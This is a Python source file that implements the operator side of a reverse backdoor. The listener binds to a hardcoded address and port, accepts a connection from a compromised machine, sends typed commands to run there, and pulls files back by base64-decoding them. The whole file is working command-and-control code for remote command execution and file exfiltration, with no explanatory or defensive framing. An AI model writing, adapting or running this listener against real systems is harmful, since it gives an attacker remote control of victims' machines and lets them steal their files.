#! /usr/bin/env python

import socket
import json
import base64

class ReverseBackdoorListener:
    def __init__(self):
        listener = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        listener.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
        listener.bind(("172.20.10.5", 4447))
        listener.listen(0)
        print("[+]Waiting for incoming connection.")
        self.connection, address = listener.accept()
        print("[+]Connection Established to " + str(address))

    def send_json_data(self,command):
        json_data = json.dumps(command)
        self.connection.send(json_data.encode())

    def receive_json_data(self):
        json_data = ""
        while True:
            try:
                json_data = json_data + self.connection.recv(1024).decode()
                return json.loads(json_data)
            except ValueError:
                continue


    def execute_command_remotely(self,command):
        self.send_json_data(command)
        if command[0]=="exit":
            self.connection.close()
            exit()
        return self.receive_json_data()

    def download_file_remotely(self,path,content):
        with open(path,"wb") as file:
                file.write(base64.b64decode(content))
        file.close()
        return "[+] File Downloaded Successfully"

    def run(self):
        while True:
            command = input(">>")
            command=command.split(" ")
            result = self.execute_command_remotely(command)
            if command[0]=="download":
                result = self.download_file_remotely(command[1],result)
            print(result)

reverse_backdoor_listener=ReverseBackdoorListener()
reverse_backdoor_listener.run()